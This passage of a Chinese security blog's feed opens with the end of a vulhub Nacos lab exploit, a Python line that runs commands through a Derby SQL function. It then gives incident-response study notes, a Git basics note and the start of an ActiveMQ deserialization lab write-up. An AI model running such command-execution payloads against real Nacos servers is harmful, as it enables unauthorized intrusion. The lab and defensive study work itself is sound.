= <span class="string">f&quot;SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;) AS a FROM config_info) tmp&quot;</span></span><br><span class="line">get_resp = requests.get(url=derby_url, params=&#123;<span class="string">&#x27;sql&#x27;</span>: get_sql&#125;)</span><br></pre></td></tr></table></figure><ul><li>利用 SQL 语句执行命令，将结果存储在数据库中并检索。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> nacos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应-深育杯</title>
      <link href="/2024/11/02/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%B7%B1%E8%82%B2%E6%9D%AF/"/>
      <url>/2024/11/02/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%B7%B1%E8%82%B2%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应-深育杯"><a href="#应急响应-深育杯" class="headerlink" title="应急响应-深育杯"></a>应急响应-深育杯</h1><h2 id="网络安全应急响应简介"><a href="#网络安全应急响应简介" class="headerlink" title="网络安全应急响应简介"></a>网络安全应急响应简介</h2><h3 id="理解为什么需要应急响应"><a href="#理解为什么需要应急响应" class="headerlink" title="理解为什么需要应急响应"></a>理解为什么需要应急响应</h3><h4 id="应急响应起源"><a href="#应急响应起源" class="headerlink" title="应急响应起源"></a>应急响应起源</h4><p>1988年，美国康乃尔大学一年级研究生罗伯特·莫里斯(23岁)写了一个99行的恶意程序。</p><p>莫里斯蠕虫是通过因特网传播的第一种蠕虫病毒，也是依据美国1986年的《计算机欺诈及滥用法案》而定罪的第一宗案件。最后罗伯特也被定罪，被判3年缓刑、400 小时社区服务及 1万美元的罚金。</p><p>1988年11月，发布到因特网上的莫里斯蠕虫病毒导致当时互联网中十分之一的计算机被感染而瘫痪，数据和资料遭大量损毁</p><p>随后，美国国防部高级研究计划局(DARPA)资助卡内基·梅隆大学成立了计算机应急响应小组(Computer Emergency ResponseTeam，缩写CERT)，设在卡内基·梅隆大学内。该小组是因特网安全的“监督者”，致力于确保适当的技术和系统管理实践的组织，抵御对网络系统的攻击并限制损害</p><h4 id="CERT-x2F-CC服务的内容"><a href="#CERT-x2F-CC服务的内容" class="headerlink" title="CERT&#x2F;CC服务的内容"></a>CERT&#x2F;CC服务的内容</h4><ul><li>安全事件响应</li><li>安全事件分析和软件安全缺陷研究</li><li>缺陷知识库开发</li><li>信息发布:缺陷、公告、总结、统计、补丁、工具</li><li>教育与培训:CSIRT管理、CSIRT技术培训、系统和网络管理员安全培训</li><li>指导其它CSIRT(也称IRT、CERT)组织建设</li></ul><h3 id="理解应急响应概念"><a href="#理解应急响应概念" class="headerlink" title="理解应急响应概念"></a>理解应急响应概念</h3><p><strong>应急响应</strong>(emergency response)组织为预防、监控、处置和管理应急事件所采取的措施和活动(GB&#x2F;T28827.3-2012应急响应规范)</p><p><strong>应急事件</strong>(emergency event)导致或即将导致运行服务对象运行中断、运行质量降低，以及需要实施重点时段保障的事件(GB&#x2F;T28827.3-2012 应急响应规范)</p><p><strong>网络安全应急响应</strong>是指有组织和协调的一系列步骤，使用技术或管理手段快速解决或减轻已报告的事件的策略与规程。</p><ul><li>应急响应与安全事件处置</li><li>应急响应客体即安全事件</li><li>应急响应更加强调，<strong>重大、突发、对业务运行造成影响</strong>的安全事件处理</li><li>常规的安全事件处置应是一个常态化的工作</li><li>总结来说，应急响应是安全事件处置中比较特别的一类处置</li></ul><p>信息安全强调的是技术与管理，在应急响应上这点也非常突出</p><p><img src="/../image/image-20241102153924455.png" alt="image-20241102153924455"></p><p>应急响应服务的目的是最快速度恢复系统的保密性、完整性和可用性，阻止和减少安全事件带来的影响</p><ul><li>停止或尽量减少攻击影响</li><li>防止同类事情再次发生</li><li>加强防御姿态和准备</li></ul><h3 id="了解应急响应流程"><a href="#了解应急响应流程" class="headerlink" title="了解应急响应流程"></a>了解应急响应流程</h3><p>参照NIST SP800-61，应急响应流程分为4个阶段即</p><p><a href="https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf">https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf</a></p><ol><li>准备</li><li>检测分析</li><li>跟踪总结</li><li>限制、消除和恢复</li></ol><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><ul><li><p>建立应急响应组织</p><ul><li>人员、职责、服务范围</li></ul></li><li><p>制定应急响应制度</p><ul><li>目标、原则、范围、各项管理制度</li></ul></li><li><p>风险评估与改进</p></li><li><p>事件分级标准</p></li><li><p>应急预案</p></li><li><p>应急演练方案</p></li></ul><p><strong>在准备阶段要完成几件重要的事</strong></p><ul><li><strong>风险评估</strong>，标识信息系统的资产价值，识别信息系统面临的自然的和人为的威胁，识别信息系统的脆弱性，分析各种威胁发生的可能性。</li><li>业务影响分析(Business lmpact Analysis)，在风险评估的基础上，分析各种信息安全事件发生时对业务功能可能产生的影响，进而确定应急响应的恢复目标。</li><li><strong>系统恢复能力等级</strong>，为基本支持、备用场地支持、电子传输和部分设备支持、电子传输及完整设备支持、实时数据传输及完整设备支持及数据零丢失和远程集群支持等6个等级</li><li><strong>恢复目标确定</strong>，恢复时间目标(RTO)和恢复点目标(RPO)</li></ul><h4 id="检测和分析"><a href="#检测和分析" class="headerlink" title="检测和分析"></a>检测和分析</h4><p><strong>检测分析阶段，强调持续</strong></p><ul><li><p>检测目标</p><ul><li>业务系统、支撑系统、网络设备、安全设备、物理环境等</li></ul></li><li><p>检测来源</p><ul><li>安全系统日志、文件完整性、第三方监测服务、日志、罐等</li></ul></li><li><p>前兆和迹象</p><ul><li><p>前兆，事件发生前的现象，如ddos试攻击、扫描</p></li><li><p>迹象，事件已经发生的现象，如进程中断、日志暴增</p></li></ul></li></ul><p><strong>分析阶段</strong></p><ul><li><p>确定事件原因</p></li><li><p>确定事件性质，分级分类</p></li><li><p>事件分析建议</p><ul><li><p>网络和系统特征，如流量大小，开放端口数量</p></li><li><p>熟悉正常的行为，来判断异常集中收集日志</p></li><li><p>开展关联性分析</p></li><li><p>保证时间同步</p></li><li><p>建立知识库</p></li></ul></li></ul><p>安全事件响应优先级，可以参照业务影响分析(BIA)的结果，也可以建立一个表格来进行判断</p><p><img src="/../image/image-20241102162700869.png" alt="image-20241102162700869"></p><ul><li><p>启动应急响应</p><ul><li><p>启动原则–快速、有序</p></li><li><p>启动依据–受损程度</p></li><li><p>启动方法–由应急响应领导小组发布启动</p></li></ul></li><li><p><strong>记录所有操作，直到应急响应结束</strong></p></li><li><p>确定事态严重程度与损害评估后，应通知应急响应领导小组，事先制定通知路径</p></li><li><p>信息安全事件发生后，应按照相关规定和要求，及时将情况上报相关主管或监管单位&#x2F;部门</p></li></ul><h4 id="限制阶段"><a href="#限制阶段" class="headerlink" title="限制阶段"></a>限制阶段</h4><ul><li><p>限制策略，在安全事件检测并分析后，在造成更大破坏前进行限制</p></li><li><p>针对不同事件会有不同限制策略</p></li><li><p>限制过程中应考虑</p><ul><li><p>资源的潜在破坏和失窃</p></li><li><p>对证据收集影响，如重启后会丢失当前内存</p></li><li><p>服务的可用性</p></li><li><p>执行策略所需资源和时间</p></li><li><p>限制策略的有效性</p></li></ul></li></ul><h4 id="消除和恢复阶段"><a href="#消除和恢复阶段" class="headerlink" title="消除和恢复阶段"></a>消除和恢复阶段</h4><ul><li>消除工作<ul><li>清除恶意代码、禁用违规账号</li></ul></li><li>有时，消除工作可以跳过，直接进行恢复</li><li>恢复工作，直接将系统从备份中恢复到正常状态，并加固</li><li>恢复工作之后，需要加强监视</li><li>恢复工作优先级可以参照业务影响分析</li><li>恢复后，通告应急结束</li></ul><h4 id="跟踪总结"><a href="#跟踪总结" class="headerlink" title="跟踪总结"></a>跟踪总结</h4><ul><li>事件原因、发生时间</li><li>事件处置流程如何?是否合规?</li><li>是否能改进事件处置?</li><li>如何加强预防?</li><li>如何加强检测?</li></ul><h4 id="应急响应团队"><a href="#应急响应团队" class="headerlink" title="应急响应团队"></a>应急响应团队</h4><p>组织应结合本单位日常机构建立信息安全应急响应的团队，并明确其职责。其中一些人可负责两种或多种职责，一些职位可由多人担任</p><p><img src="/../image/image-20241102163620791.png" alt="image-20241102163620791"></p><p><strong>领导小组是决定应急响应团队成立的要素，因为</strong></p><ul><li>管理层责任声明</li><li>适用范围声明</li><li>团队目的和目标</li><li>组织结构及相关角色</li><li>对安全事件的等级划分</li><li>报告及联系方式</li></ul><p><img src="/../image/image-20241102164303485.png" alt="image-20241102164303485"></p><h2 id="安全事件分级分类"><a href="#安全事件分级分类" class="headerlink" title="安全事件分级分类"></a>安全事件分级分类</h2><h3 id="安全事件分级"><a href="#安全事件分级" class="headerlink" title="安全事件分级"></a>安全事件分级</h3><ul><li>在对安全事件的应急响应过程中，有一重要环节是对安全事件进行分级分类</li><li>在不同标准中不同场景下，对安全事件的分级分类标准也不同</li><li>依据对安全事件分级分类，可以快速的判断安全事件的第一处置措施</li></ul><p><strong>参照中央网信办2017年6月印发的《国家网络安全事件应急预案》将网络安全事件分为4级</strong></p><ul><li>特别重大网络安全事件</li><li>重大网络安全事件</li><li>较大网络安全事件</li><li>一般网络安全事件</li></ul><h4 id="特别重大网络安全事件"><a href="#特别重大网络安全事件" class="headerlink" title="特别重大网络安全事件"></a>特别重大网络安全事件</h4><ul><li>重要网络和信息系统遭受特别严重的系统损失，造成系统大面积瘫痪，丧失业务处理能力。</li><li>国家秘密信息、重要敏感信息和关键数据丢失或被窃取、篡改、假冒，对国家安全和社会稳定构成特别严重威胁。</li><li>其他对国家安全、社会秩序、经济建设和公众利益构成特别严重威胁、造成特别严重影响的网络安全事件</li></ul><h4 id="重大网络安全事件"><a href="#重大网络安全事件" class="headerlink" title="重大网络安全事件"></a>重大网络安全事件</h4><ul><li>重要网络和信息系统遭受严重的系统损失，造成系统长时间中断或局部瘫痪，业务处理能力受到极大影响。</li><li>国家秘密信息、重要敏感信息和关键数据丢失或被窃取、篡改、假冒，对国家安全和社会稳定构成严重威胁。</li><li>其他对国家安全、社会秩序、经济建设和公众利益构成严重威胁、造成严重影响的网络安全事件。</li></ul><h4 id="较大网络安全事件"><a href="#较大网络安全事件" class="headerlink" title="较大网络安全事件"></a>较大网络安全事件</h4><ul><li>重要网络和信息系统遭受较大的系统损失，造成系统中断，明显影响系统效率，业务处理能力受到影响。</li><li>国家秘密信息、重要敏感信息和关键数据丢失或被窃取、篡改、假冒，对国家安全和社会稳定构成较严重威胁。</li><li>其他对国家安全、社会秩序、经济建设和公众利益构成较严重威胁、造成较严重影响的网络安全事件。</li></ul><h4 id="一般网络安全事件"><a href="#一般网络安全事件" class="headerlink" title="一般网络安全事件"></a>一般网络安全事件</h4><ul><li>除上述情形外，对国家安全、社会秩序、经济建设和公众利益构成一定威胁、造成一定影响的网络安全事件，为一般网络安全事件。</li></ul><h4 id="网络和信息系统损失程度划分说明"><a href="#网络和信息系统损失程度划分说明" class="headerlink" title="网络和信息系统损失程度划分说明"></a>网络和信息系统损失程度划分说明</h4><p>全事件分级有更详细指标依据《GB&#x2F;Z 20986-2007 信息安全技术信息安全事件分类分级指南》</p><p><img src="/../image/image-20241102214000851.png" alt="image-20241102214000851"></p><h3 id="应急事件划分"><a href="#应急事件划分" class="headerlink" title="应急事件划分"></a>应急事件划分</h3><p>参照GBT 28827.3–2012 信息技术服务 运维维护 第3部分:应急响应规范</p><p>首先，应急事件分级参考因素有三个维度</p><ul><li>信息系统的重要程度</li><li>信息系统服务时段</li><li>信息系统受损程度</li></ul><h4 id="信息系统的重要程度"><a href="#信息系统的重要程度" class="headerlink" title="信息系统的重要程度"></a>信息系统的重要程度</h4><ul><li>信息系统安全利益主体</li><li>信息系统处理的业务信息类别</li><li>信息系统服务范围</li><li>业务对信息系统的依赖程度</li></ul><h4 id="信息系统服务时段赋值表"><a href="#信息系统服务时段赋值表" class="headerlink" title="信息系统服务时段赋值表"></a>信息系统服务时段赋值表</h4><p><img src="/../image/image-20241109214351352.png" alt="image-20241109214351352"></p><h4 id="信息系统损失程度赋值表"><a href="#信息系统损失程度赋值表" class="headerlink" title="信息系统损失程度赋值表"></a>信息系统损失程度赋值表</h4><p><img src="/../image/image-20241109214421486.png" alt="image-20241109214421486"></p><p>事件定级步骤，将上述三个要素赋值</p><ul><li>信息系统的重要程度，取值1-4</li><li>信息系统服务时段赋值表，取值1-3</li><li>信息系统损失程度赋值表，取值1-3</li></ul><p>将三要素相乘，得到取值范围为1~36，其中</p><ul><li>三级事件为1~6</li><li>二级事件为8~18</li><li>一级事件为26~36</li></ul><h3 id="安全事件分类"><a href="#安全事件分类" class="headerlink" title="安全事件分类"></a>安全事件分类</h3><p>国家标准 GB&#x2F;Z20986-2007《信息安全事件分类指南》根据信息安全事件的起因、表现、结果等，将信息安全事件分为7个基本分类，每个基本分类包括若干个子类。</p><p>一、恶意程序事件(计算机病毒事件，蠕虫事件，特洛伊木马事件，僵尸网络事件，混合攻击程序事件，网页内嵌恶意代码事件，其他有害程序事件)</p><p>二、网络攻击事件(拒绝服务器攻击事件，后门攻击事件，漏洞攻击事件，网络扫描窃听事件，网络钓鱼事件，干扰事件，其他网络攻击事件)</p><p>三、信息破坏事件(信息篡改事件，信息假冒事件，信息泄露事件，信息窃取事件，信息丢失事件，其他信息破坏事件)</p><p>四、信息内容安全事件(违反宪法和法律，行政法规的信息安全事件、针对社会事项进行讨论评论形成网上敏感的舆论热点，出现一定规模炒作的信息安全事件、组织串联，煽动集会游行的信息安全事件、其他信息内容安全事件)</p><p>五、设备设施故障(软硬件自身故障、外围保障设施故障、人为破坏事故其他设备设施故障)</p><p>六、灾害性事件</p><p>七、其他信息安全事件</p><p>在企业层面，不同企业有不同的应用场景与业务需求。所以事件的分级与响应没有统一执行的标准。</p><p>实际在执行过程可以借鉴ISO 27005风险管理的方法，来执行企业的安全<br>事件定义</p><p>或者依据国家标准，简单的从受影响人数、经济损失、系统中断时长来定义安全事件等级，进而采取不同响应</p><h2 id="安全事件处置思路"><a href="#安全事件处置思路" class="headerlink" title="安全事件处置思路"></a>安全事件处置思路</h2><h3 id="处理DDOS事件"><a href="#处理DDOS事件" class="headerlink" title="处理DDOS事件"></a>处理DDOS事件</h3><p>事件定义:拒绝服务攻击是通过消耗CPU、内存、带宽或磁盘空间阻碍或破坏对网络、系统或应用的合法使用</p><p>常见DDOS类型：</p><ul><li>反射式</li><li>应用型</li><li>SYN FLOOD等</li></ul><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ul><li>与ISP及相关服务商沟通，在遭受DDOS时，他们能提供什么服务。如流量清洗、封掉目的IP、限制某类流量的上限、提供DDOS流量日志。并确立明确的帮助流程与人员对接、及响应时间等</li><li>部署IDS来检测DDOS攻击</li><li>对现有网络资源进行监控，建立利用率基线</li><li>建立网络性能检查的监控</li></ul><h4 id="预防工作"><a href="#预防工作" class="headerlink" title="预防工作"></a>预防工作</h4><ul><li>使用严格的防火墙规则，禁用某些流量，如echo、chargen、ssdp</li><li>使用源地址过滤设备，过滤伪造源地址流量</li><li>对某些协议的比例进行限制，如ICMP对关键的应用和设备实现冗余配置，如多ISP、FW</li><li>使用CDN保护WEB</li></ul><h4 id="检测与分析"><a href="#检测与分析" class="headerlink" title="检测与分析"></a>检测与分析</h4><h5 id="DDOS攻击的前兆"><a href="#DDOS攻击的前兆" class="headerlink" title="DDOS攻击的前兆"></a>DDOS攻击的前兆</h5><p>在DDOS攻击开始前，一般会有小规模的试探型攻击</p><ol><li>应对措施:根据试探攻击的特征来进行防护，或者迁移目标主机，加强对目标主机的保护</li></ol><p>新发布的DDOS利用工具，如2018年2月，攻击Github的memcached</p><ul><li>应对措施:分析新工具的特征，如memcached使用UDP11211端口，可以联系ISP或在边界上过滤UDP11211的流量</li></ul><h5 id="DDOS攻击的迹象"><a href="#DDOS攻击的迹象" class="headerlink" title="DDOS攻击的迹象"></a>DDOS攻击的迹象</h5><ul><li>用户报告系统不可用</li><li>无故的连接丢失</li><li>网络入侵检测报警</li><li>主机入侵检测报警</li><li>网络带宽利用率提高</li><li>大量到单台主机的连接</li><li>不对称的网络流量，进多出少</li><li>防火墙或路由器日志</li><li>数据包源地址不正常</li></ul><h4 id="限制、消除"><a href="#限制、消除" class="headerlink" title="限制、消除"></a>限制、消除</h4><h5 id="选择限制策略"><a href="#选择限制策略" class="headerlink" title="选择限制策略"></a>选择限制策略</h5><ul><li>对被利用的弱点或缺陷进行修补</li><li>根据攻击特征进行过滤</li><li>借助ISP力量进行过滤</li><li>重新部署受攻击目标</li><li>对攻击者进行反攻</li></ul><h4 id="证据收集"><a href="#证据收集" class="headerlink" title="证据收集"></a>证据收集</h4><ul><li>通过观察流量来发现攻击源</li><li>通过ISP进行追踪</li><li>了解僵尸网络主机是如何被控制</li><li>检查大量日志记录</li></ul><h3 id="处理恶意代码事件"><a href="#处理恶意代码事件" class="headerlink" title="处理恶意代码事件"></a>处理恶意代码事件</h3><p>恶意代码指的是一种被隐蔽插入到另一个程序中的程序，其目的是破坏数据、执行破坏性和入侵性程序或破坏受害者数据的安全性和完整性</p><p>恶意代码类型:病毒、木马、蠕虫、混合型</p><h4 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h4><ul><li>提高用户意识，使用户意识到恶意代码</li><li>获取反病毒厂商关于最新恶意代码的通告</li><li>对关键主机部署基于主机的IDS</li><li>在边界上限制知名的木马连接端口</li></ul><h4 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h4><ul><li>使用防病毒软件</li><li>限制特定后缀的文件，如vbs、ps</li><li>限定一些工具对文件的传输，如即时消息、网盘等</li><li>教育用户安全的处理邮件</li><li>关闭windows隐藏共享</li><li>配置浏览器策略</li><li>配置邮件客户端</li></ul><h4 id="检测与分析-1"><a href="#检测与分析-1" class="headerlink" title="检测与分析"></a>检测与分析</h4><h5 id="恶意代码前兆"><a href="#恶意代码前兆" class="headerlink" title="恶意代码前兆"></a>恶意代码前兆</h5><p>公开了一个对组织所使用软件的恶意代码利用，如2017年office公式编辑器漏洞</p><p>反病毒软件成功隔离了一个新的文件</p><h5 id="恶意代码的迹象"><a href="#恶意代码的迹象" class="headerlink" title="恶意代码的迹象"></a>恶意代码的迹象</h5><ul><li><p>反病毒服务器报警文件被感染</p></li><li><p>收发邮件数量突然大量增加</p></li><li><p>OFFICE经常使用的模板发生了变化</p></li><li><p>屏幕上出现不正常的东西</p></li><li><p>出现不正常的对话框或请求批准</p></li><li><p>计算机或程序启动很慢</p></li><li><p>系统不稳定和崩溃</p></li><li><p>存在未知本机与远程的连接</p></li><li><p>不正常的端口开启一些未知的进程</p></li><li><p>正在运行主机产生大量的对外流量</p></li></ul><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><h5 id="限制策略"><a href="#限制策略" class="headerlink" title="限制策略"></a>限制策略</h5><ul><li>确定并隔离受感染主机</li><li>发送未知的病毒样本给反病毒厂商</li><li>配置邮件服务器来限制邮件传播</li><li>阻挡特定的主机，通常是木马的控制服务器</li><li>关闭邮件服务器</li><li>断开局域网与因特网的连接</li></ul><h4 id="证据收集-1"><a href="#证据收集-1" class="headerlink" title="证据收集"></a>证据收集</h4><ul><li>尽管可以通过主机日志收集到证据，但恶意代码自身是可以互相传播</li><li>确定恶意代码的来源是比较困难的</li><li>分析病毒样本的网络特性可能会更有意义</li></ul><h4 id="消除和恢复"><a href="#消除和恢复" class="headerlink" title="消除和恢复"></a>消除和恢复</h4><ul><li>对受感染的文件进行杀毒、隔离、删除、替换</li><li>修复被恶意代码利用的弱点，如MS17-010</li><li>使用未受感染的备份进行恢复</li></ul><h3 id="处理未授权访问事件"><a href="#处理未授权访问事件" class="headerlink" title="处理未授权访问事件"></a>处理未授权访问事件</h3><p>未经授权访问就是指访问者通过非法手段，在未经允许的情况下获得使用资源的权限。</p><p>实现未授权访问的方式有:</p><ul><li>利用系统或程序漏洞</li><li>非法获取用户名和口令</li><li>社会工程学</li></ul><p>常见的未授权访问事件:</p><ul><li>非法获取服务器root权限</li><li>非法修改网站主页</li><li>暴力破解口令</li><li>数据库脱库</li><li>网络监听获取口令</li></ul><h4 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h4><ul><li>配置基于主机的IDS</li><li>使用集中的日志服务器并设置告警</li><li>防止暴力破解 (使用验证码、账号锁定、强密码策略等)</li></ul><p>对网络未授权访问的预防:</p><ul><li>配置默认拒绝的防火墙策略</li><li>使用合理的VPN身份验证，如双因子验证</li><li>划分DMZ区域，并做好区域间访问控制</li><li>对内网服务器使用私有IP地址，通过NAT转换连网</li></ul><p>对主机未授权访问的预防:</p><ul><li>定期进行漏洞扫描</li><li>关闭主机上不必要的服务</li><li>使用普通用户运行服务，如新建一个apache的账号运行apache服务</li><li>开启主机自带防火墙，如windows firewall、iptables</li><li>设置自动锁屏和注销会话的策略</li><li>定期检查权限配置</li></ul><h4 id="预防工作-1"><a href="#预防工作-1" class="headerlink" title="预防工作"></a>预防工作</h4><p>对用户未授权访问的预防:</p><ul><li>启用复杂的口令策略</li><li>在关键系统上使用双因素验证</li><li>使用强加密算法保护口令</li><li>建立完整的账号生命周期管理流程</li></ul><h4 id="检测与分析-2"><a href="#检测与分析-2" class="headerlink" title="检测与分析"></a>检测与分析</h4><p>未授权访问的征兆</p><ul><li>对系统的扫描侦察活动发生了异象，如每天大量的扫描变突然减少</li><li>一个新的远程利用漏洞公开，如针对IS的缓冲区溢出</li><li>用户反馈收到诱骗邮件，需要用户名输入账号密码</li><li>一些登录失败的日志</li></ul><p>未授权访问迹象:</p><ul><li>主机上存安全相关利用工具</li><li>主机上有不正常的流量</li><li>主机系统配置发生变化，如进程服务增加、端口增加、日志策略更改</li><li>重要数据、特权发生变化</li><li>无法解释的账户登录或使用</li><li>资源利用率发生明显变化</li><li>IDS的报警</li><li>异常的日志</li></ul><p>未授权访问事件一般会分步进行</p><ul><li>进行扫描侦察工作，发现弱点</li><li>侦察结束后，会利用弱点进行未授权访问</li><li>获取基本用户权限后，会利用提权漏洞来获取管理员权限</li><li>获取管理员权限后会使用rootkit技术来隐藏后门</li></ul><h4 id="限制、消除-1"><a href="#限制、消除-1" class="headerlink" title="限制、消除"></a>限制、消除</h4><h5 id="限制策略-1"><a href="#限制策略-1" class="headerlink" title="限制策略"></a>限制策略</h5><ul><li>隔离受影响的系统</li><li>禁用受影响的服务</li><li>消除攻击者进入系统的路径</li><li>禁用可能被利用的账号</li><li>加强物理安全保护</li></ul><h4 id="证据收集-2"><a href="#证据收集-2" class="headerlink" title="证据收集"></a>证据收集</h4><p>如果怀疑系统被未授权访问，安全处理人员应立即对系统做完整的映像备份。</p><p>同时要保存主机、应用、IDS、防火墙日志</p><p>如果发生物理安全问题，则保存门禁系统日志、监控视频等证据</p><h4 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h4><ul><li>对系统的恢复工作可以基于攻击者获取权限的程序</li><li>如攻击者获取了管理员权限，建议是从备份中恢复系统，而不是修复系统，因为很难保证rootkit的检测完整</li><li>如果攻击者只获取部分权限，可以依据日志行为分析攻击者文件。进而恢复。</li></ul><h3 id="处理复合型安全事件"><a href="#处理复合型安全事件" class="headerlink" title="处理复合型安全事件"></a>处理复合型安全事件</h3><p>复合型安全事件是指一次安全事件中包含多种安全事件，如</p><p>某恶意代码通过邮件感染了员工PC</p><p>攻击者利用被感染PC破坏了其它服务器或PC</p><p>攻击者利用获取到权限的设备发起DDOS攻击</p><p>复合型安全事件分析起来往往非常困难</p><p>安全人员可能只意识到其中一部分，而没有认识到整体的安全事件</p><p>处理人员可能知道是多起安全事件，但无法分析其联系</p><p>处理复合型事件需要丰富的安全事件处理经验</p><p>其准备、预防工作要包含全面，对组织要求较高</p><p>处理人员应该限制最先发现的安全事件</p><p>但安全事件的优先级也同样重要</p><p>正进行DDOS攻击优先级应该高于一个月前暴发病毒</p><p>使用集中式日志系统和事件关联分析软件</p><p>限制最初的安全事件，然后查找其它部分的征兆</p><p>单独对安全事件进行优先级排序</p><h2 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h2><h3 id="账户排查"><a href="#账户排查" class="headerlink" title="账户排查"></a>账户排查</h3><h4 id="账户排查主要包含以下几个维度"><a href="#账户排查主要包含以下几个维度" class="headerlink" title="账户排查主要包含以下几个维度"></a>账户排查主要包含以下几个维度</h4><ul><li><p>登录服务器的途径</p></li><li><p>弱口令</p></li><li><p>可疑账号</p><ul><li><p>新增账号</p></li><li><p>隐藏账号</p></li><li><p>克隆账号</p></li></ul></li></ul><h4 id="服务器是否存在被远程登录的途径或弱口令"><a href="#服务器是否存在被远程登录的途径或弱口令" class="headerlink" title="服务器是否存在被远程登录的途径或弱口令"></a>服务器是否存在被远程登录的途径或弱口令</h4><ul><li>3389</li><li>smb,445</li><li>http</li><li>ftp</li><li>数据库</li><li>中间件</li></ul><h3 id="网络排查"><a href="#网络排查" class="headerlink" title="网络排查"></a>网络排查</h3><h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><h3 id="注册表排查"><a href="#注册表排查" class="headerlink" title="注册表排查"></a>注册表排查</h3><h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git学习</title>
      <link href="/2024/10/05/Git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/05/Git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Git学习"><a href="#Git学习" class="headerlink" title="Git学习"></a>Git学习</h1><h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><p><a href="https://blog.csdn.net/weixin_44406127/article/details/137540031">https://blog.csdn.net/weixin_44406127/article/details/137540031</a></p><h2 id="Git-Github版本控制可视化教程"><a href="#Git-Github版本控制可视化教程" class="headerlink" title="Git-Github版本控制可视化教程"></a>Git-Github版本控制可视化教程</h2><p><a href="https://www.youtube.com/watch?v=S7XpTAnSDL4">https://www.youtube.com/watch?v=S7XpTAnSDL4</a></p><h3 id="初始检测"><a href="#初始检测" class="headerlink" title="初始检测"></a>初始检测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git --version //查看命令是否可用</span><br><span class="line">git config --global user.name &#x27;your github name&#x27; //因为就是用的GitHub的仓库，所以绑定这个，如果有自己的git仓库，则是绑定其它地址</span><br><span class="line">git config --global user.email &#x27;xx@xx.com&#x27;</span><br></pre></td></tr></table></figure><h3 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h3><p>一个项目相当于一个文件夹，而仓库就是用来存多个文件夹的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init //初始化一个仓库</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241005191031546.png" alt="image-20241005191031546"></p><p>我这里没有提示分支名称的警告，但我git branch也没有发现分支</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global init.defaultBranch main</span><br></pre></td></tr></table></figure><p>但我这里创建了，没什么反应</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode配置java环境</title>
      <link href="/2024/10/04/vscode%E9%85%8D%E7%BD%AEjava%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/10/04/vscode%E9%85%8D%E7%BD%AEjava%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-activeMQ</title>
      <link href="/2024/10/04/vulhub-activeMQ/"/>
      <url>/2024/10/04/vulhub-activeMQ/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub-activeMQ"><a href="#vulhub-activeMQ" class="headerlink" title="vulhub-activeMQ"></a>vulhub-activeMQ</h1><h2 id="activeMQ介绍"><a href="#activeMQ介绍" class="headerlink" title="activeMQ介绍"></a>activeMQ介绍</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p><a href="https://zhuanlan.zhihu.com/p/83264194#:~:text=ActiveMQ%E6%98%AF%E4%B8%80">https://zhuanlan.zhihu.com/p/83264194#:~:text=ActiveMQ%E6%98%AF%E4%B8%80</a></p><h2 id="CVE-2015-5254（反序列化）"><a href="#CVE-2015-5254（反序列化）" class="headerlink" title="CVE-2015-5254（反序列化）"></a>CVE-2015-5254（反序列化）</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>运行漏洞环境：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up 